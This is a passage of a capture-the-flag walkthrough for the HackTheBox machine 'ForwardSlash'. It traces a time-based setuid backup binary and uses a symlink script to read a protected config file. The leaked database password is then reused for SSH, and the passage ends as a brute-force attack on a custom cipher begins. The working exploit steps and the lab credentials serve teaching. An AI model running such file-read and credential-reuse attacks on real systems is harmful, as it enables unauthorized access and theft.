class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ /usr/bin/backup</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">        Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">        v0.1</span></span><br><span class="line"><span class="string">        NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">        only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Current Time: 07:50:39</span></span><br><span class="line"><span class="string">ERROR: 4e5cc88469959df047cf694749b0e917 Does Not Exist or Is Not Accessible By Me, Exiting...</span></span><br><span class="line"><span class="string">chiv@forwardslash:/$</span></span><br></pre></td></tr></table></figure><p>Uhm… This doesn’t give us a lot of information:</p><blockquote><p>ERROR: 4e5cc88469959df047cf694749b0e917 Does Not Exist or Is Not Accessible By Me, Exiting…</p></blockquote><p><code>4e5cc88469959df047cf694749b0e917</code> is MD5, but of what ? At each run of the binary this MD5 change.</p><p>Let’s run the binary through <code>ltrace</code> to see what is it actually doing “behind the hood”:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ ltrace /usr/bin/backup</span><br><span class="line">getuid()                                                      = 1001</span><br><span class="line">getgid()                                                      = 1001</span><br><span class="line">puts(<span class="string">&quot;--------------------------------&quot;</span>...----------------------------------------------------------------------</span><br><span class="line">       Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">       v0.1</span></span><br><span class="line"><span class="string">       NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">       only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">)                   = 277</span></span><br><span class="line"><span class="string">time(0)                                                       = 1586160529</span></span><br><span class="line"><span class="string">localtime(0x7ffe22beb160)                                     = 0x7fcca77e66a0</span></span><br><span class="line"><span class="string">malloc(13)                                                    = 0x55dc061618e0</span></span><br><span class="line"><span class="string">sprintf(&quot;08:08:49&quot;, &quot;%02d:%02d:%02d&quot;, 8, 8, 49)               = 8</span></span><br><span class="line"><span class="string">strlen(&quot;08:08:49&quot;)                                            = 8</span></span><br><span class="line"><span class="string">malloc(33)                                                    = 0x55dc06161900</span></span><br><span class="line"><span class="string">MD5_Init(0x7ffe22beb0b0, 4000, 0x55dc06161900, 0x55dc06161900) = 1</span></span><br><span class="line"><span class="string">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span></span><br><span class="line"><span class="string">MD5_Final(0x7ffe22beb110, 0x7ffe22beb0b0, 0x7ffe22beb0b0, 0)  = 1</span></span><br><span class="line"><span class="string">snprintf(&quot;0b&quot;, 32, &quot;%02x&quot;, 0xb)                               = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;6c&quot;, 32, &quot;%02x&quot;, 0x6c)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;c9&quot;, 32, &quot;%02x&quot;, 0xc9)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;24&quot;, 32, &quot;%02x&quot;, 0x24)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;3d&quot;, 32, &quot;%02x&quot;, 0x3d)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;b1&quot;, 32, &quot;%02x&quot;, 0xb1)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;b3&quot;, 32, &quot;%02x&quot;, 0xb3)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;a3&quot;, 32, &quot;%02x&quot;, 0xa3)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;79&quot;, 32, &quot;%02x&quot;, 0x79)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;ef&quot;, 32, &quot;%02x&quot;, 0xef)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;a9&quot;, 32, &quot;%02x&quot;, 0xa9)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;56&quot;, 32, &quot;%02x&quot;, 0x56)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;41&quot;, 32, &quot;%02x&quot;, 0x41)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;90&quot;, 32, &quot;%02x&quot;, 0x90)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;62&quot;, 32, &quot;%02x&quot;, 0x62)                              = 2</span></span><br><span class="line"><span class="string">snprintf(&quot;94&quot;, 32, &quot;%02x&quot;, 0x94)                              = 2</span></span><br><span class="line"><span class="string">printf(&quot;Current Time: %s\n&quot;, &quot;08:08:49&quot;Current Time: 08:08:49</span></span><br><span class="line"><span class="string">)                      = 23</span></span><br><span class="line"><span class="string">setuid(1002)                                                  = -1</span></span><br><span class="line"><span class="string">setgid(1002)                                                  = -1</span></span><br><span class="line"><span class="string">access(&quot;0b6cc9243db1b3a379efa95641906294&quot;..., 0)              = -1</span></span><br><span class="line"><span class="string">printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;0b6cc9243db1b3a379efa95641906294&quot;...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...</span></span><br><span class="line"><span class="string">) = 94</span></span><br><span class="line"><span class="string">setuid(1001)                                                  = 0</span></span><br><span class="line"><span class="string">setgid(1001)                                                  = 0</span></span><br><span class="line"><span class="string">remove(&quot;0b6cc9243db1b3a379efa95641906294&quot;...)                 = -1</span></span><br><span class="line"><span class="string">+++ exited (status 0) +++</span></span><br></pre></td></tr></table></figure><p>Ok so let’s break it down:</p><ol><li>We get the current user <code>uid</code> and <code>guid</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid() = 1001</span><br><span class="line">getgid() = 1001</span><br></pre></td></tr></table></figure><ol start="2"><li>The current time get generated:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">time(0)                                         = 1586160529</span><br><span class="line">localtime(0x7ffe22beb160)                       = 0x7fcca77e66a0</span><br><span class="line">malloc(13)                                      = 0x55dc061618e0</span><br><span class="line">sprintf(<span class="string">&quot;08:08:49&quot;</span>, <span class="string">&quot;%02d:%02d:%02d&quot;</span>, 8, 8, 49) = 8</span><br><span class="line">strlen(<span class="string">&quot;08:08:49&quot;</span>)                              = 8</span><br></pre></td></tr></table></figure><ol start="3"><li>A MD5 digest is made of the current time generated previously:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span><br></pre></td></tr></table></figure><ol start="4"><li>The <code>uid</code> and <code>guid</code> is changed to <code>1002</code> which correspond to the <code>backupoperator</code> group in which <code>pain</code> belongs:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setuid(1002) = -1</span><br><span class="line">setgid(1002) = -1</span><br></pre></td></tr></table></figure><ol start="5"><li>The binary try to access a file named after the MD5 digest generated previously and output error if the file does not exist:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>..., 0) = -1</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ERROR: %s Does Not Exist or Is N&quot;</span>..., <span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...) = 94</span><br></pre></td></tr></table></figure><ol start="6"><li>The <code>uid</code> and <code>guid</code> is set back to normal one and the file gets deleted:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setuid(1001)                                  = 0</span><br><span class="line">setgid(1001)                                  = 0</span><br><span class="line">remove(<span class="string">&quot;0b6cc9243db1b3a379efa95641906294&quot;</span>...) = -1</span><br></pre></td></tr></table></figure><p><strong>Tl;Dr:</strong> The <code>backup</code> binary is looking for a file with a specific name (MD5 of current time) as <code>backupoperator</code> group. </p><p>Let’s create a small script to create this specific file to see what happen when the <code>backup</code> find the file he is searching for.</p><p>Let’s make it simple to start with:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">DATE=$(date +<span class="string">&quot;%T&quot;</span>) <span class="comment"># Get the current time</span></span><br><span class="line">MD5=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>) <span class="comment"># MD5 of current time</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; <span class="string">&quot;<span class="variable">$MD5</span>&quot;</span> <span class="comment"># write file with MD5 digest as name and &#x27;hello&#x27; as content</span></span><br><span class="line">ltrace /usr/bin/backup</span><br></pre></td></tr></table></figure><p>The <code>ltrace</code> output now is slightly different:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ bash /tmp/.tmp/test-backup.sh</span><br><span class="line">getuid()                                                      = 1001</span><br><span class="line">getgid()                                                      = 1001</span><br><span class="line">puts(&quot;--------------------------------&quot;...----------------------------------------------------------------------</span><br><span class="line">       Pain&#x27;s Next-Gen Time Based Backup Viewer</span><br><span class="line">       v0.1</span><br><span class="line">       NOTE: not reading the right file yet,</span><br><span class="line">       only works if backup is taken in same second</span><br><span class="line"><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">)                   = 277</span><br><span class="line">time(0)                                                       = 1586160529</span><br><span class="line">localtime(0x7ffe22beb160)                                     = 0x7fcca77e66a0</span><br><span class="line">malloc(13)                                                    = 0x55dc061618e0</span><br><span class="line">sprintf(&quot;08:08:49&quot;, &quot;%02d:%02d:%02d&quot;, 8, 8, 49)               = 8</span><br><span class="line">strlen(&quot;08:08:49&quot;)                                            = 8</span><br><span class="line">malloc(33)                                                    = 0x55dc06161900</span><br><span class="line">MD5_Init(0x7ffe22beb0b0, 4000, 0x55dc06161900, 0x55dc06161900) = 1</span><br><span class="line">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span><br><span class="line">MD5_Final(0x7ffe22beb110, 0x7ffe22beb0b0, 0x7ffe22beb0b0, 0)  = 1</span><br><span class="line">snprintf(&quot;0b&quot;, 32, &quot;%02x&quot;, 0xb)                               = 2</span><br><span class="line">snprintf(&quot;6c&quot;, 32, &quot;%02x&quot;, 0x6c)                              = 2</span><br><span class="line">snprintf(&quot;c9&quot;, 32, &quot;%02x&quot;, 0xc9)                              = 2</span><br><span class="line">snprintf(&quot;24&quot;, 32, &quot;%02x&quot;, 0x24)                              = 2</span><br><span class="line">snprintf(&quot;3d&quot;, 32, &quot;%02x&quot;, 0x3d)                              = 2</span><br><span class="line">snprintf(&quot;b1&quot;, 32, &quot;%02x&quot;, 0xb1)                              = 2</span><br><span class="line">snprintf(&quot;b3&quot;, 32, &quot;%02x&quot;, 0xb3)                              = 2</span><br><span class="line">snprintf(&quot;a3&quot;, 32, &quot;%02x&quot;, 0xa3)                              = 2</span><br><span class="line">snprintf(&quot;79&quot;, 32, &quot;%02x&quot;, 0x79)                              = 2</span><br><span class="line">snprintf(&quot;ef&quot;, 32, &quot;%02x&quot;, 0xef)                              = 2</span><br><span class="line">snprintf(&quot;a9&quot;, 32, &quot;%02x&quot;, 0xa9)                              = 2</span><br><span class="line">snprintf(&quot;56&quot;, 32, &quot;%02x&quot;, 0x56)                              = 2</span><br><span class="line">snprintf(&quot;41&quot;, 32, &quot;%02x&quot;, 0x41)                              = 2</span><br><span class="line">snprintf(&quot;90&quot;, 32, &quot;%02x&quot;, 0x90)                              = 2</span><br><span class="line">snprintf(&quot;62&quot;, 32, &quot;%02x&quot;, 0x62)                              = 2</span><br><span class="line">snprintf(&quot;94&quot;, 32, &quot;%02x&quot;, 0x94)                              = 2</span><br><span class="line">printf(&quot;Current Time: %s\n&quot;, &quot;08:08:49&quot;Current Time: 08:08:49</span><br><span class="line">)                      = 23</span><br><span class="line">setuid(1002)                                                  = -1</span><br><span class="line">setgid(1002)                                                  = -1</span><br><span class="line"><span class="deletion">- access(&quot;0b6cc9243db1b3a379efa95641906294&quot;..., 0)            = -1</span></span><br><span class="line"><span class="deletion">- printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;0b6cc9243db1b3a379efa95641906294&quot;...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...) = 94</span></span><br><span class="line"><span class="addition">+ access(&quot;07af5e466d6f9402234d31da22aed4dd&quot;..., 0)             = 0</span></span><br><span class="line"><span class="addition">+ fopen(&quot;07af5e466d6f9402234d31da22aed4dd&quot;..., &quot;r&quot;)            = 0x5561d28ad690</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;h&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(104, 0x5561d28ae910, 0x5561d28ae911, 0x7fe33e351081) = 104</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;e&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(101, 104, 101, 0x5561d28ae912)                       = 101</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;l&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(108, 101, 108, 0x5561d28ae913)                       = 108</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;l&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(108, 108, 108, 0x5561d28ae914)                       = 108</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;o&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(111, 108, 111, 0x5561d28ae915)                       = 111</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;\n&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(10, 111, 10, 0x5561d28ae916hello)                    = 10</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;\377&#x27;</span></span><br><span class="line"><span class="addition">+ fclose(0x5561d28ad690)                                       = 0</span></span><br><span class="line">setuid(1001)                                                   = 0</span><br><span class="line">setgid(1001)                                                   = 0</span><br><span class="line">remove(&quot;0b6cc9243db1b3a379efa95641906294&quot;...)                  = -1</span><br><span class="line"><span class="comment">+++ exited (status 0) +++</span></span><br></pre></td></tr></table></figure><p>We can now see that the <code>backup</code> binary open the file and print its content to console. </p><p>So here is what we know so far: the <code>backup</code> binary will open a given file and display its content as <code>pain</code> user. Using symlink we should be able to read any files on the system owned by <code>pain</code> - like for example the <code>config.php.bak</code> file we found previously.</p><p>Let’s edit our script to try this theory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">DATE=$(date +<span class="string">&quot;%T&quot;</span>) <span class="comment"># Get the current time</span></span><br><span class="line">MD5=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>) <span class="comment"># MD5 of current time</span></span><br><span class="line">ln -s /var/backups/config.php.bak <span class="variable">$MD5</span></span><br><span class="line">/usr/bin/backup</span><br></pre></td></tr></table></figure><p>And let’s run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ bash /tmp/.tmp/test-backup.sh</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">       Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">       v0.1</span></span><br><span class="line"><span class="string">       NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">       only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Current Time: 09:38:04</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="string">server with default setting (user &#x27;</span>root<span class="string">&#x27; with no password) */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_SERVER<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USERNAME<span class="string">&#x27;, &#x27;</span>pain<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>site<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="string">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Check connection</span></span><br><span class="line"><span class="string">if($link === false)&#123;</span></span><br><span class="line"><span class="string">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>Neat, we got a new password for <code>pain</code>, while it’s for MySQL let’s try it on SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh pain@forwardslash.htb</span><br><span class="line">pain@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Apr 15 14:33:29 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">pain@forwardslash:~$ cat user.txt</span></span><br><span class="line"><span class="string">3xxxxxxxxxxxxxxxxxxxxxxc</span></span><br></pre></td></tr></table></figure><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Ok, after few struggles here we are with <code>pain</code> user. From here no need for a lot of recon since everything we need is in the home folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 pain root 4096 Mar 24 12:06 encryptorinator</span><br><span class="line">-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt</span><br><span class="line">-rw------- 1 pain pain   33 Apr 15 00:33 user.txt</span><br></pre></td></tr></table></figure><p>As a reminder the <code>note.txt</code> contains the following message:</p><blockquote><p>Pain, even though they got into our server, I made sure to encrypt any<br>important files and then did some crypto magic on the key…<br>I gave you the key in person the other day, so unless these hackers<br>are some crypto experts we should be good to go.</p><p>-chiv</p></blockquote><p>If we look into the <code>encryptorinator</code> folder we can find what <code>chiv</code> is talking about:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ ls -l encryptorinator/</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext</span><br><span class="line">-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py</span><br></pre></td></tr></table></figure><p><code>ciphertext</code> seems to be the “<em>important file</em>“ that got encrypted, and <code>encrypter.py</code> is definitely the tool used to encrypt the file. Let’s take a look:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) + <span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) + <span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> tmp &gt; <span class="number">255</span>:</span><br><span class="line">                tmp -= <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> <span class="built_in">reversed</span>(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> encrypt(<span class="string">&#x27;REDACTED&#x27;</span>, <span class="string">&#x27;REDACTED&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> decrypt(<span class="string">&#x27;REDACTED&#x27;</span>, encrypt(<span class="string">&#x27;REDACTED&#x27;</span>, <span class="string">&#x27;REDACTED&#x27;</span>))</span><br></pre></td></tr></table></figure><p>Ok, this is a not very robust crypto mechanism but definitely not trivial to break. On in opposition to Obscurity box we don’t have a clear text equivalent of the ciphertext that could help us find the key. </p><p>Two things are still interesting here. First we have access to the decrypt function. Second <code>chiv</code> says in the <code>note.txt</code>:</p><blockquote><p>I gave you the key in person the other day</p></blockquote><p>Well if the key was given in person, on a paper probably, it surely can’t be a super complicated key right…</p><p>Maybe we can try to brute-force it ? </p><h3 id="Encryption-key-bruteforce"><a href="#Encryption-key-bruteforce" class="headerlink" title="Encryption key bruteforce"></a>Encryption key bruteforce</h3><p>Let’s copy the script to our machine and tweak it a bit to brute-force the key using a wordlist. </p><p>One thing we need to think about is how our script will detect the key is correct. </p><p>We can notice that trying to decrypt the <code>ciphertext</code> with an incorrect key only output garbage:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python decrypter.py</span><br><span class="line">Using key: 123456</span><br><span class="line">Output: T:f;шā*4:M/<span class="string">&#x27;t$@ѷ~p2%ym/oPl+C1Rn/3ᚊʘ&lt;&gt;[P0с:JޢqLd]9˷?;0v~qVKܧUf&quot;e`.,*d     X</span></span><br></pre></td></tr></table></figure><p>Knowing this let’s make an <code>if</code> condition stopping the script if the output contains printable characters only, meaning the key is valid. Here is a first version:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 